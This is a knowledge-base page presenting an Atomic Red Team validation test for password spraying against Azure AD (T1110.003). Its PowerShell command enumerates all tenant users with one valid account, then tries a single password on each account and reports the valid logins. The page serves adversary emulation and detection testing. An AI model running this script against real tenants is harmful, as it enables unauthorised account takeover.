---
atomic_guid: "a8aa2d3e-1c52-4016-bc73-0f8854cfa80a"
title: "Password spray all Azure AD users with a single password"
framework: "atomic"
generated: "true"
attack_technique_id: "T1110.003"
attack_technique_name: "Brute Force: Password Spraying"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1110.003/T1110.003.yaml"
build_date: "2026-04-26 17:02:12"
executor: "powershell"
aliases:
  - "a8aa2d3e-1c52-4016-bc73-0f8854cfa80a"
  - "Password spray all Azure AD users with a single password"
platforms:
  - "azure-ad"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

# Password spray all Azure AD users with a single password

Attempt to brute force all Azure AD users with a single password (called "password spraying") via AzureAD Powershell module.
Valid credentials are only needed to fetch the list of Azure AD users.

## Metadata

- Atomic GUID: a8aa2d3e-1c52-4016-bc73-0f8854cfa80a
- Technique: T1110.003: Brute Force: Password Spraying
- Platforms: azure-ad
- Executor: powershell
- Elevation Required: False
- Dependency Executor: powershell
- Source Path: atomics/T1110.003/T1110.003.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1110-brute_force|T1110.003]]

## Input Arguments

### password

- description: Single password we will attempt to auth with (if you need several passwords, then it is a bruteforce so see T1110.001)
- type: string
- default: P@ssw0rd!

### valid_password

- description: Valid password to authenticate as valid_username in the <valid_ms_account>
- type: string
- default: iamthebatman

### valid_username

- description: Valid username to retrieve Azure AD users. We encourage users running this atomic to add a valid microsoft account domain; for eg <valid_test_user>@<valid_ms_account.com>
- type: string
- default: bruce.wayne@contoso.com

## Dependencies

AzureAD module must be installed.

### Prerequisite Check

```powershell
try {if (Get-InstalledModule -Name AzureAD -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}
```

### Get Prerequisite

```powershell
Install-Module -Name AzureAD -Force
```

## Executor

- elevation_required: False
- name: powershell

### Command

```powershell
Import-Module -Name AzureAD
$PWord = ConvertTo-SecureString -String "#{valid_password}" -AsPlainText -Force
$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "#{valid_username}", $Pword
Connect-AzureAD -Credential $Credential > $null

($Users = Get-AzureADUser -All $true) > $null
Disconnect-AzureAD > $null
$PWord = ConvertTo-SecureString -String "#{password}" -AsPlainText -Force

$Users | Foreach-Object {
  $user = $_.UserPrincipalName
  $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "$user", $Pword
  try {
    Write-Host " [-] Attempting #{password} on account ${user}."
    Connect-AzureAD -Credential $Credential 2>&1> $null
    # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success
    Write-Host " [!] ${user}:#{password} are valid credentials!`r`n"
    Disconnect-AzureAD > $null
  } catch {
    Write-Host " [-] ${user}:#{password} invalid credentials.`r`n"
  }
}
Write-Host "End of password spraying"
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1110.003/T1110.003.yaml)
